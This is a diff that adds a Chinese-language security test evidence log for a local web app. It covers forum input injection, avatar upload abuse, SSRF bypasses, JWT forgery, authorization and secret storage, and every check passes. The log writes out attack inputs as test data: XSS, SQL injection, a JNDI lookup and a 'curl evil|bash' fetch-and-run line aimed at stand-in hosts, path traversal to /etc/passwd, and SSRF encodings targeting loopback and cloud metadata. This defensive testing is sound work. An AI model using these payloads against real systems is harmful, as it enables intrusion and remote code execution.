@@ -1,0 +1,70 @@
+# 攻击证据 · 2026-11-07 23:12-23:19 · 靶场 http://127.0.0.1:18400（PID=57061，修复后重启 PID=62002）
+
+## [A] 双用户就绪
+```
+[23:12:24] [A] 双用户就绪 J1=224 J2=224
+```
+
+## [B] 论坛存储型注入（XSS / SQLi / SSTI / 路径穿越）
+```
+[23:12:24] [B1] title=<script>alert("xss")</script> → stored_title='alert("xss")' stored_content='{{7*7}}'
+[23:12:24] [B2] title=sql'-- OR 1=1 → stored_title="sql'-- OR 1=1" stored_content='union select version(),user() --'
+[23:12:25] [B3] title=${jndi:ldap://evil.th/a} → stored_title='${jndi:ldap://evil.th/a}' stored_content='{{constructor.constructor("return proces'
+[23:12:25] [B4] title=../../../../etc/passwd → stored_title='../../../../etc/passwd' stored_content=';; curl evil|bash'
+LIST: '${jndi:ldap://evil.th/a}'
+LIST: '../../../../etc/passwd'
+LIST: 'alert("xss")'
+LIST: 'sql'-- OR 1=1'
+```
+判定：`<script>`/`<img onerror>`/`<svg onload>` 标签全部被 sanitizeText 剥除；SSTI/SQLi 字符串按字面存储（JSON 存储无模板求值、无 SQL 后端）；前端 React 纯文本渲染 + 无 dangerouslySetInnerHTML 用户内容。**PASS（无存储型 XSS / SSTI / SQLi 执行）**
+
+## [C] 头像上传攻击（伪造魔数 / 3MiB 超限 / SVG 脚本 / 截断 PNG / 穿越文件名）
+全部请求附带 `filename=../../../../etc/cron.d/pwn`（服务端忽略用户文件名）：
+```
+[23:12:25] [C] av-fake.png  (GIF89a伪装PNG,  CT=image/png) → HTTP 400
+[23:12:25] [C] av-big.png   (3,000,000 字节零填充)         → HTTP 413
+[23:12:25] [C] av-xss.svg   (CT=image/svg+xml, onload脚本) → HTTP 400
+[23:12:25] [C] av-trunc.png (魔数后截断)                   → HTTP 400
+```
+判定：魔数/类型/大小校验与白名单全部生效，路径穿越文件名未参与落盘。**PASS**
+
+## [D] SSRF base_uri 绕过形态
+```
+[23:12:26] [D1] http://2130706433/v1                        → HTTP 400（十进制 IP 拒绝）
+[23:12:26] [D2] http://0x7f.0.0.1/v1                        → HTTP 400（十六进制 IP 拒绝）
+[23:12:26] [D3] http://127.1/v1                             → HTTP 400（短格式回环拒绝）
+[23:12:26] [D4] http://[::ffff:127.0.0.1]/v1               → HTTP 400（IPv4-mapped 拒绝）
+[23:12:26] [D5] gopher://127.0.0.1:6379/_info               → HTTP 400（协议拒绝）
+[23:12:33] [D6] http://metadata.google.internal/...        → HTTP 400（云元数据主机名拒绝）
+[23:12:48] [D7] https://api.openai.com/v1/../..//v1        → HTTP 200（外部域，允许用户贡献外网上游；主机非内网）
+```
+判定：全部内网/回环/元数据/非常规协议编码均被 DNS 后二次校验拒绝。**PASS**
+
+## [E] JWT 伪造（alg=none / 弱密钥 HS256）
+```
+[23:12:48] [E] alg=none 伪造 JWT → HTTP 401
+[23:12:49] [E] alg=weak 伪造 JWT → HTTP 401
+```
+判定：算法固定 HS256 + 服务端密钥校验，两种伪造全部 401。**PASS**
+
+## [F] 越权（非作者置顶/删除 + 自身资料）
+```
+[23:12:49] [F] 非作者置顶=403 非作者删除=403 改资料自身=200
+```
+判定：论坛对象按作者归属校验；全员超级用户不等于任意删帖（作者本人限定为设计语义）。**PASS**
+
+## [G] 状态文件明文密钥扫描
+```
+NO_PLAINTEXT_CREDENTIALS_IN_STATE
+  avatars/  drwx------   backups/ drwx------
+  channels.json/users.json/tokens.json/-rw-------（0600）
+  state.integrity -rw-------（SHA-256 完整性链）
+```
+判定：落盘仅密文/哈希，无 `sk-`/api_key/口令明文，文件 0600、目录 0700。**PASS**
+
+## [H] telemetry 泄露检查
+```
+TELEMETRY_KEYS= ['available','avg_ttft_ms','bucket_seconds','completion_tokens','error_count','generated_at','groups','max_ttft_ms','peak_qps','prompt_tokens','qps','qps_window_seconds','series','source','stream_requests','success_count','success_rate','total_requests','total_tokens','ttft_sample_count','window_seconds']
+PLAINTEXT_LEAK_KEYS= NONE
+```
+判定：仅聚合数字与分类键，无 request/response 原文、无凭据。**PASS**
